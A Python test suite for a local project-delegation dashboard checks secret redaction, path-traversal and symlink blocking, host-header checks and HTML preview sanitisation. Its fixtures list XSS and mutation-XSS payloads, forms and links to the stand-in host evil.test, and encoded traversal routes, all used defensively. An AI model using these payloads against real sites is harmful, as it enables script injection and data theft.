"""Offline dashboard tests; all state is synthetic and isolated in temporary directories."""
import importlib.util
import json
import os
from pathlib import Path
import tempfile
import sys
import threading
import unittest
from unittest.mock import patch
from urllib.error import HTTPError
from urllib.request import Request, urlopen

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / 'scripts'))
spec = importlib.util.spec_from_file_location('web_dashboard_test', ROOT / 'scripts/web_dashboard.py')
web = importlib.util.module_from_spec(spec)
spec.loader.exec_module(web)


class DashboardTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name).resolve()
        self.configs = []
        for name in ('one', 'two'):
            workspace = self.root / name
            runtime = workspace / '.project-delegation/runtime'
            runtime.mkdir(parents=True)
            scope = dict(workspace=str(workspace), repository='example/' + name, project_node_id=name, user_login='tester')
            config = self.root / (name + '.json')
            config.write_text(json.dumps(dict(scope, token='CONFIG-SECRET', executor={'env': {'KEY': 'ENV-SECRET'}})))
            self.configs.append(config)
            (runtime / 'binding.json').write_text(json.dumps(dict(scope=scope, binding={'provider_thread_id': 'coordinator', 'socket_path': 'SOCKET-SECRET'})))
            (runtime / 'jobs.json').write_text(json.dumps(dict(scope=scope, jobs={'job1': {'id': 'job1', 'status': 'running', 'task': {'issue_id': 'I1', 'title': 'Build alpha', 'url': 'https://github.com/example/' + name + '/issues/1'}, 'owned_paths': ['src/a.py'], 'assignment': 'PROMPT-SECRET', 'executor_config': {'token': 'EXECUTOR-SECRET'}, 'receipt': '/arbitrary/path.json', 'created_at': 1700000000}})))
            (runtime / 'job1.receipt.json').write_text(json.dumps({'status': 'running', 'thread_id': 'executor', 'executor_result': 'RESULT-SECRET', 'error': 'ERROR-SECRET', 'patch': 'PATCH-SECRET', 'checks': [{'command': 'COMMAND-SECRET', 'stdout': 'STDOUT-SECRET', 'returncode': 0}]}))
            (runtime / 'notifier.json').write_text(json.dumps(dict(scope=scope, outbox=[{'id': 'n1', 'text': 'NOTICE-SECRET', 'created_at': 1700000000}])))
            (workspace / 'reports').mkdir()
            (workspace / 'reports/report.html').write_text('<script>alert("report")</script>')
        self.app = web.Dashboard(self.configs)
        self.pid = next(iter(self.app.projects))
        self.runtime = self.root / 'one/.project-delegation/runtime'
        self.server = web.make_server(self.configs, 0)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        self.base = 'http://127.0.0.1:' + str(self.server.server_port)

    def tearDown(self):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join()
        self.temp.cleanup()

    def get(self, route, **kwargs):
        return urlopen(Request(self.base + route, **kwargs), timeout=3)

    def test_multi_project_actual_state_and_filter(self):
        with self.get('/api/projects') as response:
            index = json.load(response)
        self.assertEqual(len(index['projects']), 2)
        detail = self.app.detail(self.pid)
        self.assertEqual(detail['summary']['active'], 1)
        self.assertIsNone(detail['summary']['running_verified'])
        self.assertEqual(detail['executors'][0]['session_id'], 'executor')
        self.assertEqual(detail['coordinator']['live_status'], 'unknown')
        self.assertEqual(detail['executors'][0]['checks'][0]['status'], 'passed')
        with self.get('/api/projects/' + self.pid + '?search=nonexistent') as response:
            filtered = json.load(response)
        self.assertEqual(filtered['tasks'], [])
        self.assertEqual(filtered['summary']['active'], 1)
        self.assertEqual(self.app.detail(self.pid, {'status': ['failed']})['executors'], [])

    def test_allowlist_and_secret_redaction(self):
        serialized = json.dumps(self.app.detail(self.pid))
        for secret in ('CONFIG-SECRET', 'ENV-SECRET', 'PROMPT-SECRET', 'SOCKET-SECRET', 'RESULT-SECRET', 'ERROR-SECRET', 'PATCH-SECRET', 'COMMAND-SECRET', 'STDOUT-SECRET', 'NOTICE-SECRET', 'EXECUTOR-SECRET'):
            self.assertNotIn(secret, serialized)
        self.assertNotIn('/arbitrary/path.json', serialized)
        self.assertEqual(web.text('token=abc ghp_abcdefghij password:hunter2'), 'token=[redacted] [redacted] password=[redacted]')
        self.assertEqual(web.text('x' * 1000), 'x' * 240)

    def test_partial_corrupt_and_missing_state(self):
        original = self.app.detail(self.pid)
        (self.runtime / 'jobs.json').write_text('{"partial":')
        detail = self.app.detail(self.pid)
        self.assertTrue(detail['stale'])
        self.assertEqual(detail['executors'], original['executors'])
        self.assertEqual(detail['sources']['jobs']['status'], 'unavailable')
        fresh = web.Dashboard(self.configs).detail(self.pid)
        self.assertEqual(fresh['executors'], [])
        (self.runtime / 'binding.json').unlink()
        self.assertEqual(web.Dashboard(self.configs).detail(self.pid)['coordinator']['status'], 'unknown')

    def test_scope_mismatch_excluded(self):
        value = json.loads((self.runtime / 'jobs.json').read_text())
        value['scope']['repository'] = 'other/repo'
        (self.runtime / 'jobs.json').write_text(json.dumps(value))
        detail = self.app.detail(self.pid)
        self.assertEqual(detail['executors'], [])
        self.assertTrue(detail['sources']['jobs']['stale'])

    def test_malicious_urls_and_report_attachment(self):
        value = json.loads((self.runtime / 'jobs.json').read_text())
        value['jobs']['job1']['task']['url'] = 'javascript:alert(1)'
        value['jobs']['job1']['report_url'] = 'https://evil.test/leak'
        (self.runtime / 'jobs.json').write_text(json.dumps(value))
        detail = self.app.detail(self.pid)
        self.assertIsNone(detail['tasks'][0]['url'])
        self.assertIsNone(detail['executors'][0]['report_url'])
        with self.get(detail['reports'][0]['url']) as response:
            self.assertEqual(response.headers['Content-Type'], 'application/octet-stream')
            self.assertIn('attachment', response.headers['Content-Disposition'])
            self.assertIn('sandbox', response.headers['Content-Security-Policy'])
        for url in ['https://github.com/example/one/issues/1?token=abc', 'https://github.com.evil.test/example/one/issues/1', '//evil.test', 'https://user:pw@github.com/example/one/issues/1']:
            self.assertIsNone(web.Dashboard.issue_url(url, 'example/one'))

    def test_traversal_host_and_read_only(self):
        for route in ['/../one.json', '/%2e%2e/one.json', '/api/projects/' + self.pid + '/../../one.json', '/reports/' + self.pid + '/../../one.json', '/scripts/web_dashboard.py']:
            with self.assertRaises(HTTPError) as error:
                self.get(route)
            self.assertEqual(error.exception.code, 404)
        with self.assertRaises(HTTPError) as error:
            self.get('/api/projects', headers={'Host': 'attacker.test'})
        self.assertEqual(error.exception.code, 403)
        with self.assertRaises(HTTPError) as error:
            self.get('/api/projects', method='POST', data=b'{}')
        self.assertEqual(error.exception.code, 405)
        with self.get('/api/projects') as response:
            self.assertIsNone(response.headers.get('Access-Control-Allow-Origin'))
        before = {str(p): p.read_bytes() for p in self.root.rglob('*') if p.is_file()}
        self.app.detail(self.pid)
        after = {str(p): p.read_bytes() for p in self.root.rglob('*') if p.is_file()}
        self.assertEqual(before, after)

    def test_symlink_receipt_report_and_runtime_blocked(self):
        outside = self.root / 'outside.json'
        outside.write_text('{"thread_id":"OUTSIDE-SECRET"}')
        receipt = self.runtime / 'job1.receipt.json'
        receipt.unlink()
        try:
            receipt.symlink_to(outside)
        except (OSError, NotImplementedError):
            self.skipTest('Symlinks unavailable')
        (self.root / 'one/reports/secret.txt').symlink_to(outside)
        detail = self.app.detail(self.pid)
        self.assertIsNone(detail['executors'][0]['session_id'])
        self.assertEqual(len(detail['reports']), 1)
        self.runtime.rename(self.runtime.with_name('saved'))
        self.runtime.symlink_to(self.runtime.with_name('saved'), target_is_directory=True)
        detail = web.Dashboard(self.configs).detail(self.pid)
        self.assertEqual(detail['executors'], [])
        self.assertFalse(detail['available'])

    def test_oversized_and_wrong_structure(self):
        (self.runtime / 'jobs.json').write_text('x' * (web.MAX_JSON + 1))
        self.assertEqual(self.app.detail(self.pid)['executors'], [])
        (self.runtime / 'jobs.json').write_text(json.dumps({'scope': self.app.projects[self.pid]['scope'], 'jobs': []}))
        self.assertEqual(self.app.detail(self.pid)['sources']['jobs']['status'], 'unavailable')

    def test_html_preview_preserves_static_design_and_download_original(self):
        original = '''<!doctype html><html><head><title>Report</title>
            <style>body { background: #fdf7ec; } .grid { display: grid; }</style></head>
            <body><h1 id="overview">验收报告</h1><table><tr><th scope="col">Checks</th></tr>
            <tr><td style="color: green">Passed</td></tr></table>
            <img alt="diagram" src="data:image/png;base64,aGVsbG8=">
            <a href="#overview">Back to top</a></body></html>'''
        (self.root / 'one/reports/report.html').write_text(original)
        report = self.app.detail(self.pid)['reports'][0]
        self.assertEqual(report['format'], 'html')
        self.assertEqual(report['source'], 'reports')
        self.assertIsNone(report['job_id'])
        with self.get(report['preview_url']) as response:
            body = response.read().decode()
            self.assertEqual(response.headers['Content-Type'], 'text/html; charset=utf-8')
            self.assertIsNone(response.headers.get('Content-Disposition'))
            self.assertEqual(response.headers['Cache-Control'], 'no-store')
            self.assertEqual(response.headers['X-Content-Type-Options'], 'nosniff')
            self.assertEqual(response.headers['Referrer-Policy'], 'no-referrer')
            policy = response.headers['Content-Security-Policy']
            for directive in ('sandbox;', "script-src 'none'", "connect-src 'none'", "form-action 'none'", "base-uri 'none'", "img-src data:"):
                self.assertIn(directive, policy)
            self.assertNotIn('allow-scripts', policy)
            self.assertNotIn('allow-same-origin', policy)
        self.assertIn('<meta http-equiv="Content-Security-Policy"', body)
        self.assertLess(body.index('Content-Security-Policy'), body.index('<style>'))
        for content in ('background: #fdf7ec', 'display: grid', '验收报告', '<table>', 'style="color: green"', 'data:image/png;base64,aGVsbG8=', 'href="#overview"'):
            self.assertIn(content, body)
        with self.get(report['url']) as response:
            self.assertEqual(response.read().decode(), original)
            self.assertIn('attachment', response.headers['Content-Disposition'])
        with self.get(report['preview_url'], method='HEAD') as response:
            self.assertEqual(response.read(), b'')
            self.assertEqual(int(response.headers['Content-Length']), len(body.encode()))

    def test_preview_removes_active_content_and_outbound_navigation(self):
        malicious = '''<base href="https://evil.test/" target="_top">
            <meta http-equiv="refresh" content="0;url=https://evil.test/">
            <link rel="stylesheet" href="https://evil.test/style.css">
            <script>window.top.pwned = true;</script><script src="https://evil.test/js"></script>
            <iframe src="https://evil.test/frame" srcdoc="<script>alert(1)</script>"></iframe>
            <object data="https://evil.test/object"></object><embed src="https://evil.test/embed">
            <svg><a href="https://evil.test/svg"><text>Bad svg</text></a></svg>
            <math><mtext><img src=x onerror=alert(1)></mtext></math>
            <form action="https://evil.test/send"><input name="secret"><button formaction="https://evil.test/send">Send</button></form>
            <a href="https://evil.test/" ping="https://evil.test/ping" target="_top" download>External</a>
            <a href="javascript:alert(1)">JS</a><a href="//evil.test/">Protocol</a>
            <img src="https://evil.test/pixel" srcset="https://evil.test/x 2x" onerror="alert(1)">
            <img src="data:image/svg+xml;base64,PHN2Zz4=">
            <div onclick="alert(1)" autofocus contenteditable="true">Safe text</div>'''
        body = web.preview_html(malicious.encode()).decode()
        for absent in ('<base', 'refresh', '<link', '<script', '<iframe', '<object', '<embed', '<svg', '<math', '<form', '<input', '<button', 'https://evil.test', 'javascript:', 'onerror=', 'onclick=', 'srcset=', 'autofocus', 'contenteditable', 'target=', 'download', 'image/svg+xml', 'window.top'):
            self.assertNotIn(absent, body)
        self.assertIn('<div>Safe text</div>', body)
        self.assertIn('<a>External</a>', body)

    def test_preview_malformed_markup_is_rebuilt_and_css_is_contained(self):
        for malicious in (
            '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            '<svg><style><a id="</style><img src=x onerror=alert(1)>">',
            '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">',
            '<img src="data:image/png;base64,aaaa" SRC="https://evil.test/x" onerror="alert(1)">',
            '<style>/* <img src=x onerror=alert(1)> */ body{color:green}</style>',
            '<a href="&#106;avascript:alert(1)">unsafe</a><meta HTTP-EQUIV=refresh content="0;url=/api/projects">',
        ):
            with self.subTest(malicious=malicious):
                body = web.preview_html(malicious.encode()).decode()
                # Parse actual emitted tags, not inert CSS/comment text.
                class Tags(web.HTMLParser):
                    def __init__(self):
                        super().__init__()
                        self.tags = []
                    def handle_starttag(self, tag, attrs):
                        self.tags.append((tag, dict(attrs)))
                parsed = Tags()
                parsed.feed(body)
                for tag, attrs in parsed.tags:
                    self.assertNotIn(tag, {'script', 'svg', 'math', 'iframe', 'base'})
                    self.assertFalse(any(key.startswith('on') for key in attrs))
                    self.assertFalse(attrs.get('href', '').startswith(('javascript:', 'https:', '/')))
                    self.assertFalse(attrs.get('src', '').startswith(('https:', '/')))
        css = web.preview_html(b'<style>/* <img src=x> */</style>').decode()
        self.assertIn('\\3c img src=x>', css)

    def test_acceptance_reports_are_exactly_associated_and_history_is_actual(self):
        ledger = json.loads((self.runtime / 'jobs.json').read_text())
        for number in (1, 2):
            jid = 'job' + str(number)
            report = self.runtime / (jid + '.html')
            report.write_text('<h1>Saved acceptance ' + str(number) + '</h1>')
            os.utime(report, (1700000000 + number, 1700000000 + number))
            ledger['jobs'][jid] = dict(ledger['jobs']['job1'], report={'local_path': str(report)}, status='accepted')
        (self.runtime / 'unlisted.html').write_text('DO-NOT-EXPOSE')
        (self.runtime / 'jobs.json').write_text(json.dumps(ledger))
        detail = self.app.detail(self.pid)
        self.assertEqual(len(detail['reports']), 3)
        accepted = [report for report in detail['reports'] if report['source'] == 'acceptance']
        self.assertEqual([report['job_id'] for report in accepted], ['job2', 'job1'])
        self.assertEqual(len(detail['tasks'][0]['report_ids']), 2)
        for report in accepted:
            self.assertEqual(report['task_id'], 'I1')
            self.assertEqual(report['task_title'], 'Build alpha')
            self.assertEqual(report['issue_url'], 'https://github.com/example/one/issues/1')
            executor = next(item for item in detail['executors'] if item['id'] == report['job_id'])
            self.assertEqual(executor['report_ids'], [report['id']])
            with self.get(report['preview_url']) as response:
                self.assertIn(b'Saved acceptance', response.read())
        self.assertNotIn('unlisted.html', json.dumps(detail))
        # A legacy reports/ artifact may link to a task only through a saved exact path.
        ledger['jobs']['job1']['report']['local_path'] = 'reports/report.html'
        (self.runtime / 'jobs.json').write_text(json.dumps(ledger))
        detail = self.app.detail(self.pid)
        legacy = next(report for report in detail['reports'] if report['source'] == 'reports')
        self.assertEqual(legacy['job_id'], 'job1')
        self.assertEqual(len(detail['reports']), 2)

    def test_report_paths_cannot_grant_arbitrary_or_cross_project_reads(self):
        ledger = json.loads((self.runtime / 'jobs.json').read_text())
        for local in (str(self.configs[0]), str(self.root / 'two/reports/report.html'),
                      str(self.runtime / 'job2.html'), 'reports/../private.html',
                      'https://evil.test/report.html', '\x00bad.html'):
            with self.subTest(local=local):
                (self.runtime / 'job2.html').write_text('DO-NOT-EXPOSE')
                ledger['jobs']['job1']['report'] = {'local_path': local, 'url': 'https://evil.test/report.html'}
                (self.runtime / 'jobs.json').write_text(json.dumps(ledger))
                reports = self.app.detail(self.pid)['reports']
                self.assertEqual(len(reports), 1)
                self.assertIsNone(reports[0]['job_id'])
        (self.root / 'one/reports/report.pdf').write_bytes(b'%PDF-1.0')
        reports = self.app.detail(self.pid)['reports']
        pdf = next(report for report in reports if report['format'] == 'pdf')
        self.assertIsNone(pdf['preview_url'])
        for route in ('/preview/' + self.pid + '/' + pdf['id'], '/preview/' + self.pid + '/job1.html',
                      '/preview/' + self.pid + '/%2e%2e', '/preview/' + self.pid + '/../../one.json'):
            with self.assertRaises(HTTPError) as error:
                self.get(route)
            self.assertEqual(error.exception.code, 404)

    def test_acceptance_symlinks_scope_mismatch_and_oversize_are_excluded(self):
        ledger = json.loads((self.runtime / 'jobs.json').read_text())
        report = self.runtime / 'job1.html'
        ledger['jobs']['job1']['report'] = {'local_path': str(report)}
        (self.runtime / 'jobs.json').write_text(json.dumps(ledger))
        try:
            report.symlink_to(self.root / 'two/reports/report.html')
        except (OSError, NotImplementedError):
            self.skipTest('Symlinks unavailable')
        self.assertEqual(len(self.app.detail(self.pid)['reports']), 1)
        report.unlink()
        report.write_text('x' * (web.MAX_REPORT + 1))
        self.assertEqual(len(self.app.detail(self.pid)['reports']), 1)
        report.write_text('<h1>Acceptance</h1>')
        ledger['scope']['repository'] = 'other/repo'
        (self.runtime / 'jobs.json').write_text(json.dumps(ledger))
        # A fresh dashboard cannot infer associations from another project's ledger.
        self.assertEqual(len(web.Dashboard(self.configs).detail(self.pid)['reports']), 1)

    def test_github_context_uses_only_valid_configured_urls(self):
        project = self.app.detail(self.pid)['project']
        self.assertEqual(project['repository_url'], 'https://github.com/example/one')
        self.assertIsNone(project['project_url'])
        config = json.loads(self.configs[0].read_text())
        config['project_url'] = 'https://github.com/orgs/example/projects/9/views/2'
        self.configs[0].write_text(json.dumps(config))
        project = web.Dashboard(self.configs).detail(self.pid)['project']
        self.assertEqual(project['project_url'], config['project_url'])
        for value in ('https://github.com.evil.test/orgs/example/projects/9',
                      'https://github.com/orgs/example/projects/9?token=abc',
                      'https://user:pass@github.com/users/example/projects/9',
                      '//github.com/orgs/example/projects/9', 'javascript:alert(1)',
                      'https://github.com/orgs/example/projects/9/../settings'):
            self.assertIsNone(web.Dashboard.project_url(value))
        for repository in ('../one', 'example/..', 'example/one/issues/1', 'example/one?token=abc', 'example/one#frag'):
            self.assertIsNone(web.Dashboard.repository_url(repository))

    def test_health_contract_survives_preview_changes(self):
        with self.get('/api/health') as response:
            health = json.load(response)
        self.assertEqual(health['service'], 'project-delegation-dashboard-v1')
        self.assertEqual(health['instance'], self.server.instance)
        self.assertEqual(set(health['project_ids']), set(self.app.projects))

    @unittest.skipUnless(os.open in os.supports_dir_fd and hasattr(os, 'O_NOFOLLOW'), 'Requires descriptor-relative no-follow opens')
    def test_safe_bytes_rejects_parent_symlink_swap_during_open(self):
        reports = self.root / 'one/reports'
        outside = self.root / 'outside'
        outside.mkdir()
        (outside / 'report.html').write_text('OUTSIDE-SECRET')
        original_open = os.open
        def racing_open(path, flags, *args, **kwargs):
            if path == 'reports':
                reports.rename(reports.with_name('saved-reports'))
                reports.symlink_to(outside, target_is_directory=True)
            return original_open(path, flags, *args, **kwargs)
        # Preserve the capability-set identity while mocking the open operation.
        with patch.object(web.os, 'open', side_effect=racing_open) as opened:
            with patch.object(web.os, 'supports_dir_fd', {opened}):
                with self.assertRaises((OSError, ValueError)):
                    web.safe_bytes(reports / 'report.html', self.root / 'one', web.MAX_REPORT)


if __name__ == '__main__':
    unittest.main()
